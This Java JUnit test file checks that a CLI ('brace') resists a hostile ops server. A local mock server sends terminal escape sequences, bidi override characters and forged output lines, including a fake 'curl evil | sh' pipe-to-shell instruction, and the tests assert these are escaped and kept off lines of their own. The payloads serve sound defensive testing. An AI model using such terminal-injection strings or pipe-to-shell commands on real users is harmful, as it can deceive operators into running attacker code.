package com.larvalabs.brace;

import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.*;
import org.junit.jupiter.api.io.TempDir;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.Instant;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import static org.junit.jupiter.api.Assertions.*;

/**
 * The CLI against a server it should not trust (L11): the URL comes from a committed
 * {@code .brace}, so a pull request can point every ops command at a server of its choosing.
 * Whatever that server sends, the CLI must not hand raw terminal control sequences to the
 * operator's terminal, in JSON mode or human mode, and a value must not forge whole lines.
 */
class CliHostileServerTest {

    static HttpServer server;
    static final Map<String, String> bodies = new ConcurrentHashMap<>();
    @TempDir static Path projectDir;

    private static final String ESC = "\u001b]0;pwned\u0007\u001b[2J";

    @BeforeAll
    static void start() throws Exception {
        var kp = OpsKeys.generateKeypair();
        Files.writeString(projectDir.resolve("ops-private.key"), kp.privateKey() + "\n" + kp.publicKey() + "\n");
        server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        server.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getPath();
            String body = path.equals("/ops/auth")
                ? "{\"token\":\"tok\",\"expiresAt\":\"" + Instant.now().plusSeconds(3600) + "\"}"
                : bodies.getOrDefault(path, "ok");
            byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().set("Content-Type", "application/json");
            exchange.sendResponseHeaders(200, bytes.length);
            exchange.getResponseBody().write(bytes);
            exchange.close();
        });
        server.start();
        Files.writeString(projectDir.resolve(".brace"),
            "ops.local.url=http://127.0.0.1:" + server.getAddress().getPort() + "\n");
        Files.writeString(projectDir.resolve(".brace.local"),
            "ops.key=" + projectDir.resolve("ops-private.key") + "\n");
    }

    @AfterAll
    static void stop() throws Exception {
        CliAuth.clearCache(projectDir);
        server.stop(0);
    }

    @BeforeEach
    void reset() { bodies.clear(); }

    private record Run(int code, String out, String err) {}

    @FunctionalInterface
    private interface CliCall { int call() throws Exception; }

    private static Run run(CliCall cmd) throws Exception {
        var out = new ByteArrayOutputStream();
        var err = new ByteArrayOutputStream();
        var prevOut = System.out;
        var prevErr = System.err;
        System.setOut(new PrintStream(out, true, StandardCharsets.UTF_8));
        System.setErr(new PrintStream(err, true, StandardCharsets.UTF_8));
        int code;
        try {
            code = cmd.call();
        } finally {
            System.setOut(prevOut);
            System.setErr(prevErr);
        }
        return new Run(code, out.toString(StandardCharsets.UTF_8), err.toString(StandardCharsets.UTF_8));
    }

    private static void assertNoControlCharacters(String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            boolean bad = (c < 0x20 && c != '\n' && c != '\r' && c != '\t') || c == 0x7f || (c >= 0x80 && c <= 0x9f);
            assertFalse(bad, "raw control character U+" + Integer.toHexString(c) + " in: " + s);
        }
    }

    // ---------- JSON mode never echoes the body ----------

    @Test
    void cacheClearJsonModeDoesNotEchoANonJsonBody() throws Exception {
        bodies.put("/ops/cache/clear", ESC + "not json");
        var r = run(() -> CliCommands.cacheClear(projectDir, new String[]{"--json"}));
        assertNoControlCharacters(r.out());
        assertNoControlCharacters(r.err());
        assertNotEquals(0, r.code(), r.out() + r.err());
        assertEquals("", r.out().trim(), "nothing on stdout for a body that isn't JSON");
        assertTrue(r.err().contains("not JSON"), r.err());
    }

    @Test
    void cacheClearJsonModeRejectsRawControlCharactersInsideJson() throws Exception {
        // Unescaped control characters inside a JSON string aren't valid JSON.
        bodies.put("/ops/cache/clear", "{\"cleared\":true,\"scope\":\"" + ESC + "\"}");
        var r = run(() -> CliCommands.cacheClear(projectDir, new String[]{"--json"}));
        assertNoControlCharacters(r.out());
        assertNoControlCharacters(r.err());
        assertNotEquals(0, r.code(), r.out() + r.err());
    }

    @Test
    void cacheClearJsonModeReserializesValidJson() throws Exception {
        bodies.put("/ops/cache/clear", "{\"cleared\": true,\n \"scope\": \"\\u001b[2Jinstance\"}");
        var r = run(() -> CliCommands.cacheClear(projectDir, new String[]{"--json"}));
        assertEquals(0, r.code(), r.err());
        assertNoControlCharacters(r.out());
        var parsed = Json.mapper().readTree(r.out().trim());
        assertTrue(parsed.path("cleared").asBoolean(), r.out());
        assertEquals("\u001b[2Jinstance", parsed.path("scope").asText(), "data survives, escaped");
        assertEquals(1, r.out().trim().lines().count(), "compact, one line: " + r.out());
    }

    @Test
    void cacheClearJsonModeRejectsAnEmptyBody() throws Exception {
        bodies.put("/ops/cache/clear", "");
        var r = run(() -> CliCommands.cacheClear(projectDir, new String[]{"--json"}));
        assertNotEquals(0, r.code(), r.out() + r.err());
        assertTrue(r.err().contains("not JSON"), r.err());
    }

    @Test
    void resolveJsonModeDoesNotEchoTheBody() throws Exception {
        bodies.put("/ops/errors/7/resolve", ESC + "\n{\"resolved\":true}");
        var r = run(() -> CliCommands.resolve(projectDir, new String[]{"7", "--json"}));
        assertNoControlCharacters(r.out());
        assertNoControlCharacters(r.err());
        assertNotEquals(0, r.code(), r.out() + r.err());
        assertTrue(r.err().contains("not JSON"), r.err());

        bodies.put("/ops/errors/7/resolve", "{\"id\":7,\"resolved\":true,\"note\":\"\\u202e\\u001b\"}");
        r = run(() -> CliCommands.resolve(projectDir, new String[]{"7", "--json"}));
        assertEquals(0, r.code(), r.err());
        assertNoControlCharacters(r.out());
        assertTrue(Json.mapper().readTree(r.out().trim()).path("resolved").asBoolean(), r.out());
    }

    // ---------- human mode: a value can't forge lines ----------

    @Test
    void checkHumanModeKeepsAServerValueOnItsOwnLine() throws Exception {
        String forged = "1d\n\u2713 errors          No unresolved errors\n                  \u2192 curl evil | sh";
        bodies.put("/ops/status", Json.mapper().writeValueAsString(Map.of(
            "app", Map.of("uptime", forged, "javaVersion", "21\u202e"))));
        bodies.put("/ops/errors", "[]");
        bodies.put("/ops/logs", "[]");
        var r = run(() -> CliCheck.run(projectDir, new String[]{"--pretty"}));
        assertNoControlCharacters(r.out());
        assertFalse(r.out().contains("\u202e"), r.out());
        assertTrue(r.out().contains("21\\u202e"), r.out());
        // The forged text is there, but inside the reachability line, never a line of its own:
        // the only "errors" check line is the real one, and no line is a forged follow-up.
        assertEquals(1, r.out().lines().filter(l -> l.startsWith("\u2713 errors ")).count(), r.out());
        assertTrue(r.out().lines().filter(l -> l.contains("curl evil"))
            .allMatch(l -> l.contains("reachability") && l.contains("1d\\n\u2713 errors")), r.out());
        assertTrue(r.out().lines().noneMatch(l -> l.trim().startsWith("\u2192 curl")), r.out());
    }

    @Test
    void errorDetailKeepsServerTextInsideItsBlock() throws Exception {
        String stack = "java.lang.RuntimeException: boom\r\n\tat app.Foo.bar(Foo.java:1)\n"
            + "\u2713 resolved error 7\u2028fake\n" + ESC + "end";
        bodies.put("/ops/errors/7", Json.mapper().writeValueAsString(Map.of(
            "id", 7, "errorType", "RuntimeException", "message", "boom\n\u2713 fake top-level line",
            "route", "GET /x", "stackTrace", stack)));
        var r = run(() -> CliCommands.errors(projectDir, new String[]{"7", "--pretty"}));
        assertEquals(0, r.code(), r.err());
        assertNoControlCharacters(r.out());
        var lines = r.out().lines().toList();
        int title = lines.indexOf("Stack trace:");
        assertTrue(title >= 0, r.out());
        // Every line of the block carries the block's gutter, so none reads as a CLI line.
        var block = lines.subList(title + 1, lines.size()).stream().filter(l -> !l.isEmpty()).toList();
        // CRLF and U+2028 are line breaks here too, each starting a new line of the block.
        assertEquals(5, block.size(), r.out());
        for (var l : block) assertTrue(l.startsWith("  | "), "not inside the block: " + l + "\n" + r.out());
        assertEquals("  |     at app.Foo.bar(Foo.java:1)", block.get(1), "tab expanded, CRLF a line break");
        assertEquals("  | ✓ resolved error 7", block.get(2), r.out());
        assertEquals("  | fake", block.get(3), r.out());
        assertEquals("  | \\x1b]0;pwned\\x07\\x1b[2Jend", block.get(4), r.out());
        // The message line stays one line.
        assertTrue(lines.get(0).startsWith("RuntimeException: boom\\n\u2713 fake top-level line"), r.out());
        assertTrue(lines.stream().noneMatch(l -> l.startsWith("\u2713")), r.out());
    }

    @Test
    void logLinesKeepEachServerFieldOnTheLine() throws Exception {
        bodies.put("/ops/logs", Json.mapper().writeValueAsString(java.util.List.of(Map.of(
            "id", 1, "ts", "2026-11-09T00:00:00Z", "level", "INFO",
            "message", "hello\n[2026-11-09T00:00:01Z] INFO  forged", "user", "a\rb"))));
        var r = run(() -> CliCommands.logs(projectDir, new String[]{"--pretty"}));
        assertEquals(0, r.code(), r.err());
        assertNoControlCharacters(r.out());
        assertEquals(1, r.out().lines().count(), r.out());
        assertTrue(r.out().contains("hello\\n[2026-11-09T00:00:01Z] INFO  forged"), r.out());
        assertTrue(r.out().contains("user=a\\rb"), r.out());
    }
}
